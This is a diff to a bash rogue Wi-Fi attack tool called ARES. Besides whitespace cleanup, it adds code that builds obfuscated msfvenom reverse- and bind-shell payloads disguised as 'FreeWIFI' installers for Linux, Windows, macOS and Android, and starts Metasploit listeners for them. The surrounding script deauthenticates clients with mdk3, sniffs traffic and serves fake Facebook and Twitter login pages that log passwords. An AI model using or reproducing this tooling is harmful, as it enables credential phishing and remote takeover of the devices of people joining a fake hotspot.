@@ -2,7 +2,7 @@
 
 ########## DEBUG Mode ##########
 ##			      ##
-ARES_DEBUG=0	
+ARES_DEBUG=0
 ##			      ##
 ################################
 
@@ -15,9 +15,9 @@ clear
 
 ##################################### < CONFIGURATION  > #####################################
 DUMP_PATH="/tmp/TMPares"
-PASSLOG_PATH="/root/pwlog" # for facebook  and twitter pages 
+PASSLOG_PATH="/root/pwlog" # for facebook  and twitter pages
 WORK_DIR=`pwd`
-ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
+localip=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p'`
 # Deauth duration during handshake capture
 revision=3
 version=0.01
@@ -354,7 +354,7 @@ function checkdependences {
 	echo -ne "Dhcpd..........."
 	if ! hash dhcpd 2>/dev/null; then
 		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
-		exit=1
+#		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
 	fi
@@ -489,8 +489,8 @@ fi
 
 if [ $ARES_DEBUG != 1 ]; then
 	echo ""
-		   sleep 0.1 && echo -e "$red "                                                                                                                                       
-           sleep 0.1 && echo -e ""                                         
+		   sleep 0.1 && echo -e "$red "
+           sleep 0.1 && echo -e ""
 sleep 0.1 && echo -e "                 .o.       ooooooooo.   oooooooooooo  .oooooo..o ";
 sleep 0.1 && echo -e "                .888.      \`888   \`Y88. \`888'     \`8 d8P'    \`Y8 ";
 sleep 0.1 && echo -e "               .8\"888.      888   .d88'  888         Y88bo.      ";
@@ -499,9 +499,9 @@ sleep 0.1 && echo -e "             .88ooo8888.    888\`88b.     888    \"       
 sleep 0.1 && echo -e "            .8'     \`888.   888  \`88b.   888       o oo     .d8P ";
 sleep 0.1 && echo -e "           o88o     o8888o o888o  o888o o888ooooood8 8\"\"88888P'  ";
 sleep 0.1 && echo -e "                                                      ";
-sleep 0.2 && echo -e 
+sleep 0.2 && echo -e
 	echo""
-	
+
 	sleep 1
 	echo -e $red"                ARES "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax & princeofguilty"
 	sleep 1
@@ -664,7 +664,7 @@ function language {
 	done
 }
 
-function german { 
+function german {
 	header_setinterface="Wähle deine Netzwerk Karte"
 	setinterface_error="Es wurden keine Netzwerk Karten gefunden, beende..."
 
@@ -767,7 +767,7 @@ function english {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Active clients"
 	selection_2="Select target. For rescan type$red r$transparent"
-	generalMenu	
+	generalMenu
 }
 
 function romanian {
@@ -821,7 +821,7 @@ function romanian {
     #
     selection_1="Clienti activi"
     selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
-    generalMenu 
+    generalMenu
 }
 
 function turkish {
@@ -875,7 +875,7 @@ function turkish {
     #
     selection_1="Aktif kullanicilar"
     selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
-    generalMenu 
+    generalMenu
 }
 
 function spain {
@@ -929,7 +929,7 @@ function spain {
     #
     selection_1="Clientes activos"
     selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
-	generalMenu 
+	generalMenu
 
 }
 
@@ -1048,7 +1048,7 @@ function channelx {
 	13 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="13";channel="13";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
 	14 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="14";channel="14";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
 	* ) echo -e "This is not a channel number_- " && sleep 0.3 && echo -e "ignoring this channel number" && sleep 0.3 && echo -e "channel=1" && sleep 0.3 && Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
-	esac 
+	esac
 	}
 
 function setinterface2 {
@@ -1058,7 +1058,7 @@ function setinterface2 {
 	#unblock interfaces
 	rfkill unblock all
 
-	
+
 	# Create a variable with the list of physical network interfaces
 	readarray -t wirelessifaces < <(./airmon |grep "-" | cut -d- -f1)
 	INTERFACESNUMBER=`./airmon| grep -c "-"`
@@ -1087,7 +1087,7 @@ setinterface2
 xterm $HOLD -title "Collect Data" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e tcpdump -w DUMP_PATH/dump.pcap -i $PREWIFI
 wait 5
 
-top 
+top
 echo
 echo -e ""$red" File is saved in /tmp/TMPARES/dump.pcap" $transparent
 echo
@@ -1306,7 +1306,7 @@ function Scan {
 
 	conditional_clear
 	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one 
+	xterm $HOLD -title "$header_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one
 }
 
 # choose a network
@@ -1397,7 +1397,7 @@ function selectiontemplate {
 	read coice
 
 
-	
+
 	while true; do
 
 		conditional_clear
@@ -1652,7 +1652,7 @@ function certssl {
 		echo "  Certificate invalid or not present, please choice"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
-		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again 
+		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
 		echo -e "      "$blue"3)"$red" Exit" $transparent
 		echo " "
 		echo -n '      #> '
@@ -1673,23 +1673,23 @@ function certssl {
 		echo "  Certificate invalid or not present, please choice"
 		echo "                                       "
 		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
-		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again 
+		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
 		echo -e "      "$blue"3)"$red" Exit" $transparent
 		echo " "
 		echo -n '      #> '
 		read yn
-		
+
 		case $yn in
 			1 ) creassl;;
 			2 ) certssl; break;;
 			3 ) exitmode; break;;
 			* ) echo "$general_case_error"; conditional_clear
 		esac
-		
+
 	done
-		
+
 	fi
-	
+
 
 }
 
@@ -1723,7 +1723,7 @@ function ConnectionRESET {
 			if [ "$aresass" = "1" ]; then
                                 Facebook
                                 break
-			
+
                        elif [ "$aresass" = "2" ]; then
 				Twitter
 				break
@@ -1733,7 +1733,7 @@ function ConnectionRESET {
                        elif [ "$aresass" = "4" ]; then
 				continue
 			fi
-		
+
 	done
 	preattack
 	attack
@@ -2003,12 +2003,73 @@ function attack {
 	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
 
 	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
-	conditional_clear
+
+  # Generate payload for sites
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$localip LPORT=404 -f elf > $DUMP_PATH/FreeWIFI.elf &> $ares_output_device
+  msfvenom -p windows/shell_bind_tcp LHOST=$localip LPORT=404 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/jmp_call_additive -i 1| msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 1 | msfvenom  -a x86 --platform windows -e x86/shikata_ga_nai -i 1 -f exe -o $DUMP_PATH//FreeWIFI.exe &> $ares_output_device
+  msfvenom -p android/meterpreter/reverse_http LHOST=$localip LPORT=404 R > $DUMP_PATH/FreeWIFI.apk &> $ares_output_device
+  msfvenom -p osx/x86/shell_reverse_tcp LHOST=$localip LPORT=404 -f macho > $DUMP_PATH/FreeWIFI.macho &> $ares_output_device
+
+  ################################## < LINUX > ##################################
+  sudo rm -rf $DUMP_PATH/payloadLinux.rc
+  touch $DUMP_PATH/payloadLinux.rc
+  echo "use exploit/multi/handler" > $DUMP_PATH/payloadLinux.rc
+  echo "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> $DUMP_PATH/payloadLinux.rc
+  echo "set LHOST $localip" >> $DUMP_PATH/payloadLinux.rc
+  echo "set LPORT 404" >> $DUMP_PATH/payloadLinux.rc
+  echo "set ExitOnSession false" >> $DUMP_PATH/payloadLinux.rc
+  echo "exploit -j"  >> $DUMP_PATH/payloadLinux.rc
+
+  xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e msfconsole -r "$DUMP_PATH/payloadLinux.rc" &
+  ################################## < WINDOWS > ##################################
+
+  sudo rm -rf $DUMP_PATH/payloadWindows.rc
+  touch $DUMP_PATH/payloadWindows.rc
+
+  echo "use exploit/multi/handler" > $DUMP_PATH/payloadWindows.rc
+  echo "set PAYLOAD windows/shell_bind_tcp" >> $DUMP_PATH/payloadWindows.rc
+  echo "set LHOST $localip" >> $DUMP_PATH/payloadWindows.rc
+  echo "set LPORT 404" >> $DUMP_PATH/payloadWindows.rc
+  echo "set ExitOnSession false" >> $DUMP_PATH/payloadWindows.rc
+  echo "exploit -j"  >> $DUMP_PATH/payloadWindows.rc
+
+  xterm $HOLD $TOPLEFT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e msfconsole -r "$DUMP_PATH/payloadWindows.rc" &
+
+  ################################## < MAC > ##################################
+
+  sudo rm -rf $DUMP_PATH/payloadMac.rc
+  touch $DUMP_PATH/payloadMac.rc
+
+  echo "use exploit/multi/handler" > $DUMP_PATH/payloadMac.rc
+  echo "set PAYLOAD osx/x86/shell_reverse_tcp" >> $DUMP_PATH/payloadMac.rc
+  echo "set LHOST $localip" >> $DUMP_PATH/payloadMac.rc
+  echo "set LPORT 404" >> $DUMP_PATH/payloadMac.rc
+  echo "set ExitOnSession false" >> $DUMP_PATH/payloadMac.rc
+  echo "exploit -j"  >> $DUMP_PATH/payloadMac.rc
+
+  xterm $HOLD $TOPRIGHT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e  msfconsole -r "$DUMP_PATH/payloadMac.rc" &
+
+  ################################## < ANDROID > ##################################
+
+  sudo rm -rf $DUMP_PATH/payloadAndroid.rc
+  touch $DUMP_PATH/payloadAndroid.rc
+
+  echo "use exploit/multi/handler" > $DUMP_PATH/payloadAndroid.rc
+  echo "set PAYLOAD android/meterpreter/reverse_http" >> $DUMP_PATH/payloadAndroid.rc
+  echo "set LHOST $localip" >> $DUMP_PATH/payloadAndroid.rc
+  echo "set LPORT 404" >> $DUMP_PATH/payloadAndroid.rc
+  echo "set ExitOnSession false" >> $DUMP_PATH/payloadAndroid.rc
+  echo "exploit -j"  >> $DUMP_PATH/payloadAndroid.rc
+
+  xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#FF0009" -title "Mfsconsole" -e  msfconsole -r "$DUMP_PATH/payloadAndroid.rc" &
+
+  ################################## < MAC > ##################################
+  conditional_clear
 
 	while true; do
 		top
 
-		echo "Attack in progress .."
+		echo "Attack in progress .. $localip"
 		echo "                                       "
 		echo "		1) Choose another network"
 		echo "		2) Exit"
@@ -2210,17 +2271,17 @@ function Tcpdump {
 
 }
 
-function topusers { 
-echo -e " " 
+function topusers {
+echo -e " "
 echo -e " _ _ _ "
  echo -e " /   \ __ _ _// _/ "
- echo -e " / /\  |       /| )_ ___ \ " 
- echo -e " / | \ | | / \ " 
- echo -e " __| /|  /__ /___ / " 
- echo -e " / / / / " 
+ echo -e " / /\  |       /| )_ ___ \ "
+ echo -e " / | \ | | / \ "
+ echo -e " __| /|  /__ /___ / "
+ echo -e " / / / / "
  echo -e " "
 }
-# Create a Facebook login page 
+# Create a Facebook login page
 function Facebook {
 mkdir $DUMP_PATH/data &>$ares_output_device
         cp  $WORK_DIR/Sites/Facebook/config.ini $DUMP_PATH/data
